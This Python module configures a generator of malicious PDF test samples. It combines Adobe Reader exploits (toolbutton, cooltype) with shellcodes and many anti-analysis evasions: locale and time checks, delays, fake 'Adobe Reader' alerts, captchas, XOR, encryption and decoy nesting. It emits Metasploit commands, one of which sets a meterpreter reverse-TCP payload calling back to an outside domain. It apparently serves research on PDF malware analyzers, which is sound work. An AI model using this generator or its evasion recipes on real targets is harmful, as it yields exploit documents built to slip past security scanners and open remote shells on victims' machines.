'''
Should you modify this file, do it hand in hand with 'pdf_evasion.rb'.
This is the right place to add new test casess ('translate' function needs also to be updated
accordingly), new shellcodes, and new exploit modules.
author: Saeed Ehteshamifar (salpha.2004@gmail.com)
Summer 2017
'''

'''
adding a new test case has an implication:
1. adding the test case in the proper format at the bottom of this file where tests are defined

adding a new evasion has three implications in addition to above:
1. defining the evasion test function and putting the name in the right category (e.g. static, 
    dynamic) at the bottom of the file
2. reflecting the changes in 'translate_evasion' function
3. translating the new evasion into its ID in the function 'get_id'
'''

'''
change SHELLCODE to SHELLCODE_ALL, SHELLCODE_REVERSE_BIND, SHELLCODE_POWERSHELL, SHELLCODE_CALC, SHELLCODE_EXIT, or SHELLCODE_NONE to generate for the specified shellcode only.
likewise change EXP to include or exlcude the exploitation trigger from the generated samples.
likewise chnage EVASIONS to the type of evasions you'd like to generate.
'''

import itertools

# THE FOLLOWING EXPLOIT, SHELLCODE, AND EVASION CONST ARE CONSIDERED IN 
# THEIR ENUMERATION FUNCTIONS RESPECTIVELY.
EXPLOIT_ALL = "all"
EXPLOIT_TOOLBUTTON = "toolbutton"
EXPLOIT_COOLTYPE = "cooltype"
# for which exploits should the test suite be created?
# valid values are the values above.
EXPLOIT = EXPLOIT_ALL

SHELLCODE_ALL = "all"
SHELLCODE_REVERSE_BIND = "reverse_bind"
SHELLCODE_POWERSHELL = "powershell"
SHELLCODE_CALC = "calc"
# for which shellcodes should the test suite be created?
# valid values are the values above.
SHELLCODE = SHELLCODE_ALL

# TODO: possible to merge EVASION_ALL_DYNAMIC, EVASION_DYNAMIC, and EVASION_DYNAMIC_COMBINED to EVASION_DYNAMIC (same for the other types too)
EVASION_ALL = "all"
EVASION_ALL_DYNAMIC = "all_dynamic"
EVASION_ALL_STATIC = "all_static"
EVASION_ALL_HYBRID = "all_hybrid"
EVASION_DYNAMIC = "dynamic"
EVASION_STATIC = "static"
EVASION_BOTH = "dynamic_static" # TODO: change to EVASION_HYBRID
EVASION_DYNAMIC_COMBINED = "dynamic_combined"
EVASION_STATIC_COMBINED = "static_combined"
EVASION_BOTH_COMBINED = "dynamic_static_combined"
EVASION_NO_EVASION = "none"
# for which classes of evasion should the testcases be created?
# valid values are the above const variables.
EVASIONS = EVASION_DYNAMIC



def no_testcase():
    return []

def dynamic_testcases():
    global EVASIONS
    EVASIONS = EVASION_DYNAMIC
    return enumerate_evasions(include_no_evasion = False)

def static_testcases():
    global EVASIONS
    EVASIONS = EVASION_STATIC
    return enumerate_evasions(include_no_evasion = False)

def single_evasion_testcases():
    global EVASIONS
    EVASIONS = EVASION_DYNAMIC
    dynamic = enumerate_evasions(include_no_evasion = False)

    EVASIONS = EVASION_STATIC
    static = enumerate_evasions(include_no_evasion = False)

    return dynamic + static

def all_testcases():
    global EVASIONS
    EVASIONS = EVASION_ALL
    return enumerate_evasions(include_no_evasion = False)

def dynamic_static():
    global EVASIONS
    EVASIONS = EVASION_BOTH
    return enumerate_evasions(include_no_evasion = False)

def dynamic_combined():
    global EVASIONS
    EVASIONS = EVASION_DYNAMIC_COMBINED
    return enumerate_evasions(include_no_evasion = False)

def static_combined():
    global EVASIONS
    EVASIONS = EVASION_STATIC_COMBINED
    return enumerate_evasions(include_no_evasion = False)

def dynamic_static_combined():
    global EVASIONS
    EVASIONS = EVASION_BOTH_COMBINED
    return enumerate_evasions(include_no_evasion = False)



def get_base_evasion(evasion):
    if (type(evasion) is str): # meaning that testcase_id has been passed to the function
        # find the test case corresponding to the testcase_id
        for testcase in all_testcases():
            if (get_id(testcase) == evasion):
                return get_base_evasion(testcase)
    elif (type(evasion) is list):
        base_evasions = []
        evs = split_combined_testcase(evasion)
        for ev in evs:
            base_evasions.append(ev[1])
        return "-".join(base_evasions)

def dynamic_part(evasion):
    try:
        head = evasion.index("dynamic")
        tail = evasion.index("static")
        return evasion[head:tail]
    except ValueError as val_err:
        if "dynamic" in str(val_err): # test case has no dynamic part
            return []
        if "static" in str(val_err): # test case has no static part (all dynamic)
            return evasion

def static_part(evasion):
    try:
        head = evasion.index("static")
        tail = len(evasion)
        return evasion[head:tail]
    except ValueError as val_err: # test case has no static part
        return []

def constituents(evasion):
    if (is_evasion_hybrid(evasion)):
        return split_combined_testcase(
            dynamic_part(evasion)
            ) + split_combined_testcase(
            static_part(evasion)
            ) + [dynamic_part(evasion)] + [static_part(evasion)]
    else:
        return split_combined_testcase(
            dynamic_part(evasion)
            ) + split_combined_testcase(
            static_part(evasion)
            )

def is_evasion_hybrid(evasion):
    if evasion.count('dynamic') > 1 and evasion.count('static') > 1:
        return True
    else:
        return False

def is_evasion_combined(evasion):
    if evasion.count('dynamic') + evasion.count('static') > 1:
        return True
    else:
        return False


def enumerate_evasions(include_no_evasion=True):
    res = []
    if (include_no_evasion):
        res.append([]) # corresponds to no evasion case.
    
    if (EVASIONS == EVASION_NO_EVASION):
        return res

    # dynamic evasion only
    if (EVASIONS == EVASION_ALL or EVASIONS == EVASION_DYNAMIC):
        for evasion in all_dynamic_evasions():
            for testcase in globals().get(evasion)():
                res.append (testcase)
    # static evasion only
    if (EVASIONS == EVASION_ALL or EVASIONS == EVASION_STATIC):
        for evasion in all_static_evasions():
            for testcase in globals().get(evasion)():
                res.append (testcase)
    # all combinations of dynamic + static evasion
    if (EVASIONS == EVASION_ALL or EVASIONS == EVASION_BOTH):
        for dynamic_evasion in all_dynamic_evasions():
            for static_evasion in all_static_evasions():
                for dyn_testcase in globals().get(dynamic_evasion)():
                    for sta_testcase in globals().get(static_evasion)():
                        res.append (dyn_testcase + sta_testcase)

    # combined dynamic evasions
    if (EVASIONS == EVASION_ALL or EVASIONS == EVASION_DYNAMIC_COMBINED):
        for evasion in combined_dynamic_evasions():
            for testcase in globals().get(evasion)():
                res.append (testcase)
    # combined static evasions
    if (EVASIONS == EVASION_ALL or EVASIONS == EVASION_STATIC_COMBINED):
        for evasion in combined_static_evasions():
            for testcase in globals().get(evasion)():
                res.append (testcase)
    # all combinations of combined dynamic + static evasions
    if (EVASIONS == EVASION_ALL or EVASIONS == EVASION_BOTH_COMBINED):
        for dynamic_evasion in combined_dynamic_evasions():
            for static_evasion in combined_static_evasions():
                for dyn_testcase in globals().get(dynamic_evasion)():
                    for sta_testcase in globals().get(static_evasion)():
                        res.append (dyn_testcase + sta_testcase)

    return res

# 'exps' determines which exploits should be enumerated
def enumerate_exploits(exps=EXPLOIT):
    if (exps == EXPLOIT_ALL):
        return [EXPLOIT_TOOLBUTTON, EXPLOIT_COOLTYPE]
    return [exps]

# 'shells' determines which shellcodes should be enumerated
def enumerate_shellcodes(shells=SHELLCODE):
    if (shells == SHELLCODE_ALL):
        return [SHELLCODE_REVERSE_BIND, SHELLCODE_POWERSHELL, SHELLCODE_EXIT]
    return [shells]



def expected_signals(shell):
    signals = ["none"]
    if (shell == SHELLCODE_CALC):
        signals = ["process_spawn"]
    if (shell == SHELLCODE_POWERSHELL):
        signals = ["process_spawn", "file_write"]
    if (shell == SHELLCODE_REVERSE_BIND):
        signals = ["network_activity"]
    return signals
    


# translates single dynamic and/or static evasions + combined dynamic and/or static evasions to MS string.
def  translate_evasion(evasion):
    msf_str = ""
    oracle = ""
    dynamic_evasion = ""
    static_evasion = ""


    if "dynamic" in evasion and "static" in evasion:
        oracle += "1"
    elif "dynamic" in evasion:
        oracle += "d"
    elif "static" in evasion:
        oracle += "s"
    else:
        oracle += "0"

    
    dynamic_evasions = []
    if "dynamic" in evasion:
        msf_str += "set dynamic_evasion? yes;"
        dynamic_evasions = [evasion[i+1] for i, x in enumerate(evasion) if x == "dynamic"]
        msf_str += "set dynamic_evasion " + ",".join(dynamic_evasions) + ";"
    else:
        msf_str += "set dynamic_evasion? no;"


    # for argument-taking evasions...
    for dynamic_evasion in dynamic_evasions:
        oracle += "---" + dynamic_evasion
        if (dynamic_evasion == "lang"):
            msf_str += "set languages " + evasion[evasion.index("lang")+1] + ";"
            oracle += "--" + evasion[evasion.index("lang")+1].replace(",", "-").replace(" ", "")

        if (dynamic_evasion == "resol"):
            # exceptional cases where the evasion conflicts with the exploit.
            msf_str += "set EXITFUNC thread;"
            msf_str += "set resolution " + evasion[evasion.index("resol")+1] + ";"
            oracle += "--" + evasion[evasion.index("resol")+1].replace(",", "-").replace(" ", ""
                ).replace(">=", "gte").replace(">", "gt").replace("<=", "lte").replace("<", "lt")

        if (dynamic_evasion == "mons"):
            msf_str += "set mons_count " + evasion[evasion.index("mons")+1] + ";"
            oracle += "--" + evasion[evasion.index("mons")+1].replace(",", "-").replace(" ", "")

        if (dynamic_evasion == "alert_one"):
            msf_str += "set alert_title " + evasion[evasion.index("alert_one")+1] + ";"
            msf_str += "set alert_text " + evasion[evasion.index("alert_one")+2] + ";"
            msf_str += "set alert_type " + evasion[evasion.index("alert_one")+3] + ";"

        if (dynamic_evasion == "alert_three"):
            msf_str += "set alert_title " + evasion[evasion.index("alert_three")+1] + ";"
            msf_str += "set alert_text " + evasion[evasion.index("alert_three")+2] + ";"
            msf_str += "set alert_type " + evasion[evasion.index("alert_three")+3] + ";"
            msf_str += "set intended_buttons " + evasion[evasion.index("alert_three")+4] + ";"
            oracle += "--" + evasion[evasion.index("alert_three")+4].replace(",", "-"
                ).replace(" ", "")

        if (dynamic_evasion == "scroll"):
            msf_str += "set page_number " + evasion[evasion.index("scroll")+1] + ";"
            oracle += "--" + evasion[evasion.index("scroll")+1]

        if (dynamic_evasion == "captcha"):
            msf_str += "set response_box_title " + evasion[evasion.index("captcha")+1] + ";"
            msf_str += "set response_box_question " + evasion[evasion.index("captcha")+2] + ";"
            msf_str += "set intended_responses " + evasion[evasion.index("captcha")+3] + ";"
            oracle += "--" + evasion[evasion.index("captcha")+3].replace(",", "-").replace(" ", "")

        if (dynamic_evasion == "delay"):
            msf_str += "set delay " + evasion[evasion.index("delay")+1] + ";"
            oracle += "--" + evasion[evasion.index("delay")+1]

        if (dynamic_evasion == "tod"):
            msf_str += "set date " + evasion[evasion.index("tod")+1] + ";"
            oracle += "--" + evasion[evasion.index("tod")+1].replace(",", "-").replace(" ", "")
            msf_str += "set time " + evasion[evasion.index("tod")+2] + ";"
            oracle += "-" + evasion[evasion.index("tod")+2].replace(",", "-").replace(" ", ""
                ).replace(">=", "gte").replace(">", "gt").replace("<=", "lte").replace("<", "lt")

        if (dynamic_evasion == "rand"):
            msf_str += "set rand_range " + evasion[evasion.index("rand")+1] + ";"
            oracle += "--" + evasion[evasion.index("rand")+1].replace(" ", ""
                ).replace(">=", "gte").replace(">", "gt").replace("<=", "lte").replace("<", "lt")


    static_evasions = []
    if "static" in evasion:
        msf_str += "set static_evasion? yes;"
        static_evasions = [evasion[i+1] for i, x in enumerate(evasion) if x == "static"]
        msf_str += "set static_evasion " + ",".join(static_evasions) + ";"
    else:
        msf_str += "set static_evasion? no;"

    # for argument-taking evasions...
    for static_evasion in static_evasions:
        oracle += "---" + static_evasion
        if (static_evasion == "xor"):
            msf_str += "set xor_key " + evasion[evasion.index("xor")+1] + ";"
            oracle += "--" + evasion[evasion.index("xor")+1]

        if (static_evasion == "decoy"):
            msf_str += "set decoy_path \"" + evasion[evasion.index("decoy")+1] + "\";"
            oracle += "--" + evasion[evasion.index("decoy")+1].split("/")[-1].split(".")[0]


        if (static_evasion == "enc"):
            msf_str += "set password \"" + evasion[evasion.index("enc")+1] + "\";"
            if (evasion[evasion.index("enc")+1] != ""):
                oracle += "--" + evasion[evasion.index("enc")+1]


        if (static_evasion == "nest"):
            msf_str += "set nesting_times " + evasion[evasion.index("nest")+1] + ";"
            msf_str += "set nest_wrapper_decoy " + evasion[evasion.index("nest")+2] + ";"
            oracle += "--" + evasion[evasion.index("nest")+1]
            oracle += "-" + evasion[evasion.index("nest")+2].split("/")[-1].split(".")[0]


        if (static_evasion == "objstm"):
            msf_str += "set objstm_wrapper_decoy " + evasion[evasion.index("objstm")+1] + ";"
            oracle += "--" + evasion[evasion.index("objstm")+1].split("/")[-1].split(".")[0]

    return (msf_str, oracle)

# translate the combination to a Metasploit CLI command. this func should be called per testcase.
def translate(exp, shell, evasion, sample_filename):
    msf_str = ""
    oracle = "" # instructs the oracle tester how to anti-evade evasions to activate the exploit

    # exploit commands
    if (exp == EXPLOIT_TOOLBUTTON):
        msf_str += "use exploit/windows/fileformat/adobe_toolbutton_with_evasion;"
        oracle += "tool___"

    if (exp == EXPLOIT_COOLTYPE):
        msf_str += "use exploit/windows/fileformat/adobe_cooltype_with_evasion;"
        oracle += "cool___"


    # shellcode commands
    if (shell == SHELLCODE_REVERSE_BIND):
        msf_str += "set shellcode? yes;"
        msf_str += "set payload windows/meterpreter/reverse_tcp_dns;"
        # a local IP address tailored to my oracle sandbox with VirtualBox Host-only net adapter.
        msf_str += "set LHOST deliciousveganista.party;"
        msf_str += "set LPORT 80;"
        if ("mons" in evasion or "resol" in evasion):
            # exceptional cases where the evasion conflicts with the exploit.
            # TODO: separation of concerns! this function shouldn't touch anything that 'translate_evasion' should take care of.
            msf_str += "set EXITFUNC thread;"
        else:
            msf_str += "set EXITFUNC process;"
        oracle += "r"

    if (shell == SHELLCODE_POWERSHELL):
        msf_str += "set shellcode? yes;"
        msf_str += "set payload windows/exec;"
        msf_str += "set CMD powershell.exe Set-Content \$Env:TMP'\\'script.txt Hi;" # the only weird escaping that works!
        if ("mons" in evasion or "resol" in evasion):
            # exceptional cases where the evasion conflicts with the exploit.
            msf_str += "set EXITFUNC thread;"
        else:
            msf_str += "set EXITFUNC process;"
        oracle += "p"

    if (shell == SHELLCODE_CALC):
        msf_str += "set shellcode? yes;"
        msf_str += "set payload windows/exec;"
        msf_str += "set CMD calc.exe;"
        if ("mons" in evasion or "resol" in evasion):
            # exceptional cases where the evasion conflicts with the exploit.
            msf_str += "set EXITFUNC thread;"
        else:
            msf_str += "set EXITFUNC process;"
        oracle += "c"

    if (shell == SHELLCODE_EXIT):
        msf_str += "set shellcode? yes;"
        msf_str += "set payload windows/exit;"
        if ("mons" in evasion or "resol" in evasion):
            # exceptional cases where the evasion conflicts with the exploit.
            msf_str += "set EXITFUNC thread;"
        else:
            msf_str += "set EXITFUNC process;"
        oracle += "e"

    # evasion commands
    (strr, name) = translate_evasion(evasion)
    msf_str += strr
    oracle += name

    msf_str += "set filename " + sample_filename + ";"
    msf_str += "run;"

    return (msf_str, oracle)



def split_combined_testcase(tc):
    splitted = []
    for itr in range(0, len(tc)):
        if (tc[itr] == "dynamic" or tc[itr] == "static"):
            start = itr
            for end in range(itr+1, len(tc)):
                if (tc[end] == "dynamic" or tc[end] == "static"):
                    splitted.append(tc[start:end])
                    break;
                if (end == len(tc)-1):
                    splitted.append(tc[start:end+1])
                    break;
    return splitted

def tr(testcase_arg):
    trd = testcase_arg.replace(",", "_").replace("-", "_")
    trd = trd.replace("<=", "lte").replace("<", "lt")
    trd = trd.replace(">=", "gte").replace(">", "gt")
    trd = trd.replace(" ", "")
    return trd

def get_id(testcase):
    if (testcase == []):
        return "none"

    # if there's only a single evasion...
    if (bool(testcase.count("dynamic") == 1) != bool(testcase.count("static") == 1)): # logical xor
        if ("lang" in testcase):
            arg = testcase[-1]
            return "lang_{0}".format(tr(arg))
        if ("resol" in testcase):
            arg = testcase[-1]
            return "resol_{0}".format(tr(arg))
        if ("mons" in testcase):
            arg = testcase[-1]
            return "mons_{0}".format(tr(arg))
        if ("alert_three" in testcase):
            arg = testcase[-1]
            return "alert_three_{0}".format(tr(arg))
        if ("captcha" in testcase):
            arg = testcase[-1]
            return "captcha_{0}".format(tr(arg))
        if ("delay" in testcase):
            arg = testcase[-1]
            return "delay_{0}".format(tr(arg))
        if ("tod" in testcase):
            arg = testcase[-1]
            return "tod_{0}".format(tr(arg))
        if ("rand" in testcase):
            arg = testcase[-1]
            return "rand_{0}".format(tr(arg))
        if ("xor" in testcase):
            arg = testcase[-1]
            return "xor_{0}".format(tr(arg))
        if ("decoy" in testcase):
            arg = testcase[-1].split('/')[-1].replace(".pdf", "").replace(".PDF", "")
            return "decoy_{0}".format(tr(arg))
        if ("nest" in testcase):
            arg = testcase[-2]
            return "nest_{0}".format(tr(arg))
        return testcase[1] # for not argument-taking test cases. testcase[1] is the evasion name.

    # if there are multiple evasions...
    testcase_id = ""
    testcases = split_combined_testcase(testcase)
    for tc in testcases:
        testcase_id += get_id(tc) + "_"
    testcase_id = testcase_id[:-1] # remove the last underscore
    
    return testcase_id



'''
FORMAT FOR EACH TEST CASE: 
evasion type: 'static' or 'dynamic'
evasion name
evasion arguments IN ORDER
'''
###############################################################
##### D Y N A M I C   E V A S I O N S   T E S T C A S E S #####
###############################################################
def all_dynamic_evasions():
    return [
    "lang", "filename", "resol", "mons",
    "alert_one", "alert_three", "mouse", "scroll", "doc_close", "captcha",
    "delay", "tod", "rand",
    ]

def lang():
    return [
    ["dynamic", "lang", "enu"],
    ["dynamic", "lang", "deu"],
#   ["dynamic", "lang", "fra"],
#   ["dynamic", "lang", "esp"],
#   ["dynamic", "lang", "jpn"],
#   ["dynamic", "lang", "kor"],
#   ["dynamic", "lang", "deu, enu"],
    ]

def filename():
    return [
    ["dynamic", "filename"],
    ]

def resol():
    return [
    ["dynamic", "resol", ">=1920x1200"],
    ["dynamic", "resol", "<1920x1200"],
#   ["dynamic", "resol", "portrait, <750x750"],
    ]

def mons():
    return [
    ["dynamic", "mons", "1"],
    ["dynamic", "mons", "2,3,4"],
    ]

def alert_one():
    return [
    ["dynamic", "alert_one", "Adobe Reader", "File seems to be broken.", "warning"],
    ]

def alert_three():
    return [
    ["dynamic", "alert_three", "Adobe Reader", 
        "This file has JavaScript and may harm your computer. Proceed?", "error", "no, cancel"],
    ["dynamic", "alert_three", "Adobe Reader", 
        "This file contains JavaScript and may harm your computer. "
        "Do you want to disable JavaScript and protect your computer?", "info", "yes"],
    ]

def mouse():
    return [
    ["dynamic", "mouse"],
    ]

def scroll():
    return [
    ["dynamic", "scroll", "3"],
    ]

def doc_close():
    return [
    ["dynamic", "doc_close"],
    ]

def captcha():
    return [
    ["dynamic", "captcha", "Do you know?", "Who invented the Light Bulb?",
        "thomas, edison, thomas edison"],
    ]

def delay():
    return [
    ["dynamic", "delay", "3"], # delay in seconds.
    ["dynamic", "delay", "600"], # delay in seconds.
    ]

def tod():
    return [
#    ["dynamic", "tod", "everyday", "anytime"],
#    ["dynamic", "tod", "7.6.17, 8.6.17", "anytime"],
    ["dynamic", "tod", "everyday", "8,9"],
    ["dynamic", "tod", "everyday", "0,1,2,3,4,5,6,7,10,11,12,13,14,15,16,17,18,19,20,21,22,23"],
#    ["dynamic", "tod", "everyday", ">=8, <=16"],
    ]

def rand():
    return [
#   ["dynamic", "rand", ">=0.25"],
    ["dynamic", "rand", "<0.2"],
    ]

#################################################################################
##### C O M B I N E D   D Y N A M I C   E V A S I O N S   T E S T C A S E S #####
#################################################################################
# evasions will be applied in the order defined in each testcase.
# e.g. for lang_filename, first the language would be checked (and evaded) and then the filename.
# it is the user's responsibility to make sure the combination makes sense!
def combined_dynamic_evasions():
    return [
    "mouse_alert_one", "scroll_alert_one", "doc_close_alert_one",
    "scroll_mouse", "doc_close_mouse", "scroll_mouse_doc_close",
    "scroll_tod_lang_filename_mons_mouse_alert_three"
    ]

def mouse_alert_one():
    return[
    ["dynamic", "mouse", "dynamic", "alert_one", "Adobe Reader", "File seems to be broken.",
        "warning"],
    ]

def scroll_alert_one():
    return[
    ["dynamic", "scroll", "3", "dynamic", "alert_one", "Adobe Reader",
        "File seems to be broken.", "warning"],
    ]

def doc_close_alert_one():
    return[
    ["dynamic", "doc_close", "dynamic", "alert_one", "Adobe Reader", "File seems to be broken.",
        "warning"],
    ]

def scroll_mouse():
    return[
    ["dynamic", "scroll", "3", "dynamic", "mouse"],
    ]

def doc_close_mouse():
    return[
    ["dynamic", "doc_close", "dynamic", "mouse"],
    ]

def scroll_mouse_doc_close():
    return[
    ["dynamic", "scroll", "3", "dynamic", "mouse", "dynamic", "doc_close"],
    ]

def scroll_tod_lang_filename_mons_mouse_alert_three():
    return[
    ["dynamic", "scroll", "3", "dynamic", "tod", "everyday", "8,9,10,11,12,13,14,15,16",
        "dynamic", "lang", "deu", "dynamic", "filename", "dynamic", "mons", "2,3,4",
        "dynamic", "mouse", "dynamic", "alert_three", "Adobe Reader", "This file has "
            "JavaScript and may harm your computer. Proceed?", "error", "no, cancel"],
    ]

#############################################################
##### S T A T I C   E V A S I O N S   T E S T C A S E S #####
#############################################################
def all_static_evasions():
    return [
    "xor", "decoy", "rev", "nest", "content", "steganography", "objstm"
    ]

def xor():
    return [
    ["static", "xor", "40"],
    ]

def decoy():
    return[
    ["static", "decoy", "/decoys/form-js-openaction.pdf"],
    ["static", "decoy", "/decoys/has-link.pdf"],
    ["static", "decoy", "/decoys/only-text-long-doc.pdf"],
    ]

# passwords should not have special characters (!, #, ...).
def enc():
    return[
    ["static", "enc", ""], # default pass (auto decryption)
    ["static", "enc", "bozbozeghandi"], # non-default pass (asked on open)
    ]

def rev():
    return [
    ["static", "rev"],
    ]

def nest():
    return [
    ["static", "nest", "1", "/decoys/only-text-long-doc.pdf"],
    ["static", "nest", "5", "/decoys/only-text-long-doc.pdf"],
    ]

def content():
    return [
    ["static", "content"]
    ]

def steganography():
    return [
    ["static", "steganography"]
    ]

def objstm():
    return [
    ["static", "objstm", "/decoys/one-non-empty-page.pdf"]
    ]

###############################################################################
##### C O M B I N E D   S T A T I C   E V A S I O N S   T E S T C A S E S #####
###############################################################################
# evasions will be applied in the order defined in each testcase.
# e.g. for decoy_enc, first the decoy would be created and then encrypted.
# it is the user's responsibility to make sure the combination makes sense!
# NOTE: combined evasions are to pass through analyzers as much as possible. therefore
# combined dynamic evasions are combined with combined static evasion only
# (and not single static evasions).
def combined_static_evasions():
    return [
    "xor_steganography_content", "objstm_decoy_nest"
    ]

def xor_steganography_content():
    return [
    ["static", "xor", "40", "static", "steganography", "static", "content"],
    ]

def objstm_decoy_nest():
    return[
    ["static", "objstm", "/decoys/one-non-empty-page.pdf",
        "static", "decoy", "/decoys/has-link.pdf",
        "static", "nest", "5", "/decoys/only-text-long-doc.pdf"],
    ]

###################################################################
###################################################################